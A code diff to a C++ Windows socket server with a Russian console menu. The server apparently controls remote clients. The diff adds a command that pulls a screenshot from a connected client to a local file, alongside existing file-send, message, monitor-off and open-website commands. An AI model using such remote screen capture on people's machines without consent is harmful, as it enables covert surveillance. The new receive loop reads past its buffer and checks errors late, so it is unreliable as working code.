@@ -83,7 +83,7 @@ int main() {
 		while (true) {
 			char m_connect[256] = "";
 			int i = 0;
-			std::cout << "Введите команду:\n--s передать файл\n--m вывести сообщение\n--o выключить монитор\n--e закрыть клиент\n--w открыть сайт\n";
+			std::cout << "Введите команду:\n--s передать файл\n--m вывести сообщение\n--o выключить монитор\n--e закрыть клиент\n--w открыть сайт\n--c сделать скриншот\n";
 			char a = getchar();
 			while (a != '\n') {
 				m_connect[i] = a;
@@ -104,11 +104,44 @@ int main() {
 					char bufer[1024] = "";
 					int b = fread(bufer, 1, sizeof(bufer), in);
 					int size = ftell(in);
-					printf("bytes read: %d, part:%d, pos: %ld \n", b, size);
+					//printf("bytes read: %d, part:%d, pos: %ld \n", b, size);
 					if (b != 0) send(Connections[ClientCount], bufer, b, 0);
 				}
 				send(Connections[ClientCount], "@@^", 3, 0);
+				fclose(in);
 				std::cout << "Файл отправлен!\n";
+			}
+			else if ((m_connect[2] == 'c') && (m_connect[0] == '-') && ((m_connect[1] == '-'))) {
+				std::cout << "Пытаюсь загрузить скриншот\n";
+				char buff[1024];
+				HANDLE hFile;
+				hFile = CreateFile("screendown.png",
+					GENERIC_WRITE,
+					0,
+					NULL,
+					OPEN_ALWAYS,
+					FILE_ATTRIBUTE_NORMAL,
+					NULL);
+				DWORD dwBytesWritten;
+				while (1) {
+					char buff[1028] = "";
+					int nbytes = recv(Connect, buff, sizeof(buff), 0);
+					if ((buff[0] == '@') && (buff[1] == '@') && (buff[2] == '^')) {
+						std::cout << "Screenshot loaded\n"; break;
+					}
+					if ((buff[nbytes-2] == '@') && (buff[nbytes-1] == '@') && (buff[nbytes] == '^')) {
+						std::cout << "Screenshot loaded\n"; break;
+					}
+					WriteFile(hFile, buff, nbytes, &dwBytesWritten, NULL);
+					if (nbytes == 0) {
+						break;
+					}
+					if (nbytes < 0)
+					{
+						break;
+					}
+				}
+				CloseHandle(hFile);
 			}
 		}
 	}
